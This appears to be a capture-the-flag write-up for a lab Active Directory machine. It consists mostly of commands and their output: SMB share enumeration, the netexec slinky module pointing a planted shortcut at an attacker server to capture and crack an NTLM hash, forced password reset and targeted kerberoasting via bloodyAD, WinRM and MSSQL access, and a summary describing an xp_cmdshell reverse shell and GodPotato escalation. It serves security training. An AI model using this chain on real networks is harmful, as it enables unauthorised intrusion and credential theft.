---
image: /assets/posts/post-icons/share-the-pain.jpg
---
## Initial setup


```console
10.1.158.1
```

```terminal
10.1.158.1     DC01.hack.smarter hack.smarter DC01
```

## NMAP

```terminal
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-08 07:43:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-08T07:44:54+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.hack.smarter
| Not valid before: 2025-09-05T03:46:00
|_Not valid after:  2026-03-07T03:46:00
| rdp-ntlm-info:
|   Target_Name: HACK
|   NetBIOS_Domain_Name: HACK
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hack.smarter
|   DNS_Computer_Name: DC01.hack.smarter
|   DNS_Tree_Name: hack.smarter
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-08T07:44:46+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:window
```
## SMB

```terminal
nxc smb $TARGET -u '' -p '' --shares
```

```
[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ nxc smb $TARGET -u '' -p '' --shares
SMB         10.1.158.1      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)
SMB         10.1.158.1      445    DC01             [+] hack.smarter\:
SMB         10.1.158.1      445    DC01             [*] Enumerated shares
SMB         10.1.158.1      445    DC01             Share           Permissions     Remark
SMB         10.1.158.1      445    DC01             -----           -----------     ------
SMB         10.1.158.1      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.158.1      445    DC01             C$                              Default share
SMB         10.1.158.1      445    DC01             IPC$                            Remote IPC
SMB         10.1.158.1      445    DC01             NETLOGON                        Logon server share
SMB         10.1.158.1      445    DC01             Share           READ,WRITE
SMB         10.1.158.1      445    DC01             SYSVOL                          Logon server share
```
We can see that share has read and write

```terminal
nxc smb $TARGET -u $Un -p $Pw -M slinky -o SERVER=10.129.215.23 NAME=bingus
```

```terminal
responder -I tun0 -v
```

```terminal
nxc smb 10.1.158.1 -u '' -p ''  -M slinky -o SERVER=10.200.22.155 NAME=bingus
```

```terminal
BOB.ROSS::HACK:abaefa5a2e1d39b0:1e9001b05165ee93d6cc59b30a19b804:01010000000000000088bd56dc67dc014cc131169ba5161600000000020008004d0057005700450001001e00570049004e002d004f003100580043004f004600520055004d0041005a0004003400570049004e002d004f003100580043004f004600520055004d0041005a002e004d005700570045002e004c004f00430041004c00030014004d005700570045002e004c004f00430041004c00050014004d005700570045002e004c004f00430041004c00070008000088bd56dc67dc0106000400020000000800300030000000000000000100000000200000fabc0a96a5b4968c4f90876a8c0ecd923f0515af14f704bd28797cd3f6cf6d630a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00320032002e003100350035000000000000000000:137Password123!@#
```

![](/assets/posts/img/d08b3fe4657e8d0a47d37b67a345cb52.png)

```
137Password123!@#
```

```customterm
 hashcat hash /opt/SecLists/rockyou.txt
```

```
bob.ross
```

```
137Password123!@#
```

```
smbclient.py $DOMAIN/$Un:$Pw@$TARGET
```

## kerberoast

```
GetUserSPNs.py "$DOMAIN/$Un:$Pw" -dc-ip "$DC" -request -k -debug
```

	[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ GetUserSPNs.py "$DOMAIN/$Un:$Pw" -dc-ip "$DC" -request -k -debug
	/home/livid/.local/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
	  import pkg_resources
	Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies
	
	[+] Impacket Library Installation Path: /home/livid/.local/lib/python3.13/site-packages/impacket
	[*] Getting machine hostname
	[+] Connecting to DC01.hack.smarter, port 389, SSL False, signing True
	[-] CCache file is not found. Skipping...
	[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
	[+] Trying to connect to KDC at DC01.hack.smarter:88
	[+] Trying to connect to KDC at DC01.hack.smarter:88
	[+] Trying to connect to KDC at DC01.hack.smarter:88
	[+] Total of records returned 3
	No entries found!
## asreproast

```
nxc ldap $TARGET -u $Un -p '137Password123!@#' --asreproast ASREProastables.txt --kdcHost $DC
```

	[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ nxc ldap $TARGET -u $Un -p '137Password123!@#' --asreproast ASREProastables.txt --kdcHost $DCLDAP        10.1.158.1      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
	LDAP        10.1.158.1      389    DC01             [+] hack.smarter\bob.ross:137Password123!@#
	LDAP        10.1.158.1      389    DC01             No entries found!
## get users list

```
nxc smb $TARGET -u 'bob.ross' -p '137Password123!@#' --users-export users.txt
```

## bloodyad

```
bloodyAD -u bob.ross -p '137Password123!@#' --dc-ip 10.1.158.1 get writable
```

	[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ bloodyAD -u $Un -p $Pw --dc-ip $TARGET get writable
	
	distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hack,DC=smarter
	permission: WRITE
	
	distinguishedName: CN=bob.ross,CN=Users,DC=hack,DC=smarter
	permission: WRITE
	
	distinguishedName: CN=alice.wonderland,CN=Users,DC=hack,DC=smarter
	permission: CREATE_CHILD; WRITE
	OWNER: WRITE
	DACL: WRITE

We have generic write over alice.wonderland


```
bloodyAD --host 10.1.158.1 -d hack.smarter -u bob.ross -p '137Password123!@#' set password alice.wonderland Password123!
```

	[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ bloodyAD --host $TARGET -d $DOMAIN -u $Un -p $Pw set password alice.wonderland 'Password123!'
	[+] Password changed successfully!

```
bloodyAD -u alice.wonderland -p 'Password123!' --dc-ip 10.1.158.1 get writable
```

	[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ bloodyAD -u alice.wonderland -p 'Password123!' --dc-ip 10.1.158.1 get writable
	
	distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hack,DC=smarter
	permission: WRITE
	
	distinguishedName: CN=alice.wonderland,CN=Users,DC=hack,DC=smarter
	permission: WRITE

```
bloodyAD -u alice.wonderland -p 'Password123!' --dc-ip 10.1.158.1 get membership alice.wonderland
```

Alice's groups

```
[livid@blackrock ~/Sec/hacksmarter/sharethepain]$ bloodyAD -u alice.wonderland -p 'Password123!' --dc-ip 10.1.158.1 get membership alice.wonderland

distinguishedName: CN=Users,CN=Builtin,DC=hack,DC=smarter
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=hack,DC=smarter
objectSid: S-1-5-32-580
[livid@blackrock ~d/general/vault/.obsidian/plugins/default-code-block-lanaguage]$ bloodyAD -u alice.wonderland -p 'Password123!' --dc-ip 10.1.158.1 get membership bob.ross

distinguishedName: CN=Users,CN=Builtin,DC=hack,DC=smarter
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=hack,DC=smarter
objectSid: S-1-5-21-3782576407-3043698477-3578684825-513
sAMAccountName: Domain UserssAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=hack,DC=smarter
objectSid: S-1-5-21-3782576407-3043698477-3578684825-513
sAMAccountName: Domain Users
```

Bob.ross groups

```
 bloodyAD -u alice.wonderland -p 'Password123!' --dc-ip 10.1.158.1 get membership bob.ross

distinguishedName: CN=Users,CN=Builtin,DC=hack,DC=smarter
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=hack,DC=smarter
objectSid: S-1-5-21-3782576407-3043698477-3578684825-513
sAMAccountName: Domain Users
```


## GenericAll on alice.

![](/assets/posts/img/10ba255f0344567b56687a7d23c7280e.png)



## targeted kerberoast on alice account

Set SPN
```
bloodyAD -d "$DOMAIN" --host "$TARGET" -u bob.ross -p '137Password123!@#' set object alice.wonderland servicePrincipalName -v 'http/anything'
```

![](/assets/posts/img/5ff948f297ab55d58836bc57dcf0134e.png)

```
GetUserSPNs.py -dc-ip $TARGET $DOMAIN/"bob.ross" -request-user "alice.wonderland"
```


![](/assets/posts/img/ce1e84580a340c4fdf675364a24ada30.png)

we find alices passwod to be 

```
Password123!
```

Which i think we set that before. 


## Windows remote

```
evil-winrm -u alice.wonderland -p 'Password123!' -i $TARGET 
```

![](/assets/posts/img/37e18fbfd3b1e65daa215c0c8343fb7a.png)




```
mssqlclient.py -dc-ip 240.0.0.1 $DOMAIN/alice.wonderland:'Password123!'@240.0.0.1 -windows-auth
```

using windows-auth allows for authentication for the alice user onto the db


![](/assets/posts/img/3954769f481c29743cb3a465e19b56a0.png)


![](/assets/posts/img/d69770f92a8fdaa66dc8fab54f9aa69d.png)


we have seimpersonate as this user.

![](/assets/posts/img/6ca27093d3650502b8c0955828e0260d.png)

We went from an inital user that we obtained using slinky id log posioning on a share we had write access to. Which leaks bob.ross' ntlm hash that is crackable. We then do a password change or targeted kerberoast on alice, and then psexec or winrm into alice. We find the internal port 1433 mssql and use ligolo to access using the magic ip of 240.0.0.1 which is the hosts internal ip address. And then we login as alice using windows auth on the mssql and do xp cmdshell into a reverseshell that then allows us to get seimpersonate as the database user, and then we can use godpotato for nt authority.

